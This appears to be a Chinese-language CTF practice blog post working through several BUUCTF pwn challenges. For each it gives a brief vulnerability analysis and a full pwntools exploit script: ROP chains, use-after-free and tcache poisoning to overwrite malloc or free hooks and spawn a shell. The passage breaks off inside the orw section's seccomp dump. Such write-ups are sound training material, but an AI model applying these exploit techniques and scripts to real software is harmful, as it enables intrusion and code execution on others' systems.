    <content type="html"><![CDATA[<h1 id="BUUCTF暑假刷题-1"><a href="#BUUCTF暑假刷题-1" class="headerlink" title="BUUCTF暑假刷题(1)"></a>BUUCTF暑假刷题(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>静态链接。32位程序。用<code>int 80h</code> 这个中断调用，呼叫系统调用程序<code>system_call()</code>.。</p><p>然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>，即可拿到shell。</p><p>32位系统调用表：<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./simplerop'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29124</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()offset = <span class="hljs-number">32</span>start = <span class="hljs-number">0x8048E45</span>read = <span class="hljs-number">0x806CD50</span>pop_eax_ret = <span class="hljs-number">0x080bae06</span>pop_ebx_ret = <span class="hljs-number">0x080481c9</span>pop_ecx_ebx_ret = <span class="hljs-number">0x0806e851</span>pop_edx_ret = <span class="hljs-number">0x0806e82a</span>pop3_ret = <span class="hljs-number">0x08048913</span>bss = <span class="hljs-number">0x80EC2EC</span> - <span class="hljs-number">0x10</span>ret = <span class="hljs-number">0x8048E6F</span>in_t_0x80 = <span class="hljs-number">0x080493e1</span>payload = <span class="hljs-string">'a'</span> * offset + flat([read,pop3_ret,<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x8</span>])payload += flat([pop_eax_ret,<span class="hljs-number">11</span>,pop_ecx_ebx_ret,<span class="hljs-number">0</span>,bss,pop_edx_ret,<span class="hljs-number">0</span>,in_t_0x80])sa(<span class="hljs-string">':'</span>,payload)s(<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>其中rop链read后返回地址：<code>pop3_ret</code>，是为了pop <code>0,bss,0x8</code>，然后再跟着rop。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">rec_str_free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span>&#123;  <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)ptr + <span class="hljs-number">2</span>));  <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Note freed!"</span>);&#125;</code></pre></div><p>每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_del</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span>  v0 = ask((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Index"</span>);  <span class="hljs-keyword">return</span> (*(<span class="hljs-keyword">int</span> (__cdecl **)(<span class="hljs-keyword">int</span>))(records[v0] + <span class="hljs-number">4</span>))(records[v0]);&#125;</code></pre></div><p>利用这个函数来劫持程序流程。<br>先<code>new(0,2,0x40,payload)</code>看一下程序的内存情况, 对于其中的<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ：</p><div class="hljs"><pre><code class="hljs c">gef➤  p &amp;records$<span class="hljs-number">1</span> = (&lt;data variable, no debug info&gt; *) <span class="hljs-number">0x804b080</span> &lt;records&gt;gef➤  x/wx <span class="hljs-number">0x804b080</span><span class="hljs-number">0x804b080</span> &lt;records&gt;:    <span class="hljs-number">0x08635160</span>gef➤  x/wx <span class="hljs-number">0x08635160</span><span class="hljs-number">0x8635160</span>:      <span class="hljs-number">0x080486de</span></code></pre></div><p>所以 <code>records[v0]</code>  = 0x08635160 </p><div class="hljs"><pre><code class="hljs c">gef➤  x/wx <span class="hljs-number">0x08635160</span>+<span class="hljs-number">4</span><span class="hljs-number">0x8635164</span>:      <span class="hljs-number">0x08048725</span>gef➤  x/i <span class="hljs-number">0x08048725</span>   <span class="hljs-number">0x8048725</span> &lt;rec_str_free&gt;:    push   ebp</code></pre></div><p>所以 <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>且<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>如图，把这里的函数指针控制成<code>sh\x00\00</code> + <code>&amp;system</code> ,即执行<code>do_del</code>时，运行的就是<code>system(sh)</code>可拿到shell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_n_3'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26453</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(id,type,len,context)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))    sla(<span class="hljs-string">"Type &gt;"</span>,str(type))    sla(<span class="hljs-string">"th &gt;"</span>,str(len))    sa(<span class="hljs-string">"ue &gt;"</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">"CNote &gt;"</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex &gt;"</span>,str(id))payload = <span class="hljs-string">"a"</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)system = elf.plt[<span class="hljs-string">'system'</span>]new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,<span class="hljs-string">'sh\x00\x00'</span>+ p32(system))free(<span class="hljs-number">1</span>)itr()</code></pre></div><h4 id="无system函数情况下"><a href="#无system函数情况下" class="headerlink" title="无system函数情况下"></a>无system函数情况下</h4><p>Leak libc，还是攻击那一个函数指针，本地通远程没通。</p><p>在测试的时候，由于fgets总是在你传入的字符串后加上<code>\x00</code>，曾经就遇到<br>过，导致泄漏十分难进行，但是发现：</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span></code></pre></div><p>传入空字节竟然可以通过，且没有加上<code>\x00</code>，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'a'</span> + <span class="hljs-string">'\n'</span>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span>,payload)free(<span class="hljs-number">0</span>)payload = <span class="hljs-string">''</span>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x0</span>,payload)ru(<span class="hljs-string">"lue="</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d89d8</span>info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">4</span> + <span class="hljs-string">'/bin/sh\x00'</span> +<span class="hljs-string">'\n'</span>new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span><span class="hljs-number">-0x10</span>,payload)new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)new(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x40</span>,payload)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">4</span>)rec = libc_base + <span class="hljs-number">0x3d123</span>new(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x9</span>,p32(rec) + p32(rec))<span class="hljs-comment"># free(5)</span>show(<span class="hljs-number">5</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./vn_pwn_easyTHeap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc-2.27.so'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25814</span>)    libc = ELF(remote_libc)elf = ELF(local_file)<span class="hljs-comment"># libc = elf.libc</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"?"</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,context)</span>:</span>    sla(<span class="hljs-string">"choice"</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(context))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,p64(heapbase+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,<span class="hljs-string">'\x07'</span>*<span class="hljs-number">0x10</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)__malloc_hook = libc_base + <span class="hljs-number">0x3ebc30</span>__realloc_hook = __malloc_hook <span class="hljs-number">-0x8</span>payload = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">8</span>+<span class="hljs-number">7</span>) + <span class="hljs-string">'\x01'</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(__realloc_hook)edit(<span class="hljs-number">4</span>,payload)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>onerec = <span class="hljs-number">0x10a38c</span> + libc_baserealloc_addr = libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>]info_addr(<span class="hljs-string">'relloc'</span>,realloc_addr)info_addr(<span class="hljs-string">'__malloc_hook'</span>,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+<span class="hljs-number">8</span>)edit(<span class="hljs-number">5</span>,payload)add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18，保护全开，存在uaf漏洞。</p><p>程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"gift :%p\n"</span>, heaplist[HIDWORD(size)]);</code></pre></div><p>删除堆后，没有置0的操作，存在uaf。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。</li></ul><p>难点：</p><ul><li>泄漏libc地址</li><li>精巧的构造一个任意地址写（在<code>tcache struct</code>处折腾）</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_final_3'local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'remote_libc = local_libc # './libc.so.6'context.log_level = 'debug'debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote('node3.buuoj.cn',27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = ['tmux','neww']rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,content):    sla("&gt;",'1')    sla('index',str(idx))    sla('size',str(size))    sa('thing',str(content))    ru("0x")    gift = int(r(12),16)    info_addr('gift',gift)    return giftdef free(idx):    sla("&gt;",'2')    sla("index",str(idx))heap_base = add(0,0x48,'a') - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * '\x07'add(3,0x48,payload)free(3)payload = 0x30 * '\x00'add(4,0x48,payload)add(5,0x10,' ')libc_base = add(6,0x78,' ') - 0x3ebca0info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre></div><p>调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>只是一个简单的rop，考的就是32位下如何控制传参数。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./PicoCTF_2018_rop_chain'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29550</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>] <span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = []realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()win_function1 = <span class="hljs-number">0x080485CB</span>win_function2 = <span class="hljs-number">0x80485D8</span>flag = <span class="hljs-number">0x0804862B</span>offset = <span class="hljs-number">0x18</span> + <span class="hljs-number">4</span>ru(<span class="hljs-string">'Enter your input&gt;'</span>)payload = <span class="hljs-string">'a'</span> * offset + flat([win_function1,win_function2,flag,<span class="hljs-number">0xBAAAAAAD</span>,<span class="hljs-number">0xDEADBAAD</span>])<span class="hljs-comment"># debug()</span>s(payload + <span class="hljs-string">'\n'</span>)itr()</code></pre></div><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>考点 ：</p><ul><li>简单shellcode 的编写</li><li>seccomp（挖坑）</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>先用<code>seccomp-tools</code>看下禁用了什么函数：</p><div class="hljs"><pre><code class="hljs undefined">➜  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) goto <span class="hljs-number">0011</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) goto <span class="hljs-number">0011</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) goto <span class="hljs-number">0011</span> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span 